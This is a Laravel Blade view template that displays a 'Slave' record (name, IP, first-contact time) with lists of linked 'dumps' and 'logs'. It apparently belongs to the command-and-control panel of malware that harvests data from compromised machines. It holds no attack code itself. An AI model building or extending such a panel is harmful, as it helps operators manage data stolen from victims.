@extends("templates.command")
@section("content")
    <div class="row">
        <div class="col-md-12">
            <h2>Slave</h2>
            <table class="table table-bordered">
                <tr>
                    <td width="25%">Name</td>
                    <td width="75%">{{ $slave->name }}</td>
                </tr>
                <tr>
                    <td>IP</td>
                    <td>{{ $slave->ip }}</td>
                </tr>
                <tr>
                    <td>First contact:</td>
                    <td>{{ $slave->created_at }}</td>
                </tr>
            </table>
            <h3>Dumps ({{ $slave->dumps->count() }})</h3>
            @if($slave->dumps->count() == 0)
                <div class="empty">No dumps for this user as of yet</div>
            @else
                <table class="table">
                    @foreach($slave->dumps as $dump)
                        <tr>
                            <td>{{ "#".$dump->id." dump of ".$dump->created_at }}</td>
                            <td class="text-right"><a href="{{ route('command.dump', $dump->id) }}">View dump</a></td>
                        </tr>
                    @endforeach
                </table>
            @endif
            <h3>Logs ({{ $slave->logs->count() }})</h3>
            @if($slave->logs->count() == 0)
                <div class="empty">No logs for this user as of yet</div>
            @else
                <table class="table">
                    @foreach($slave->logs as $log)
                        <tr>
                            <td>{{ "#".$log->id." dump of ".$log->created_at }}</td>
                            <td class="text-right"><a href="{{ route('command.log', $log->id) }}">View log</a></td>
                        </tr>
                    @endforeach
                </table>
            @endif
        </div>
    </div>
@stop
